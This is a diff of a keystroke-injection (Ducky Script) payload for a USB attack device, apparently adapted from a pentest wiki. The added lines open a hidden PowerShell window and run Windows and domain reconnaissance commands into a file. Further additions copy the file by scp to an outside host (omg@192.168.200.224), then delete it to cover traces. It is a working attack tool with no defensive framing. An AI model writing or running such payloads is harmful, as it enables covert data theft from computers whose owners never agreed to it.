@@ -1,7 +1,15 @@
 
 
 REM | Reference: https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows
-
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING powershell -windowstyle hidden -command cmd
+ENTER
+DELAY 2000
 STRING echo ##whoami >> sys
 ENTER
 STRING whoami >> sys
@@ -54,6 +62,15 @@ STRING echo ##net group "Domain Controllers" /domain >> sys
 ENTER
 STRING net group "Domain Controllers" /domain >> sys
 ENTER
-
-
+STRING scp sys omg@192.168.200.224:~/
+ENTER
+DELAY 2000
+REM ~~ | Change p@ssw0rd! below to the ssh user's password
+STRING yes
+DELAY 5000
+ENTER
+STRING del sys
+ENTER
+STRING exit
+ENTER
 
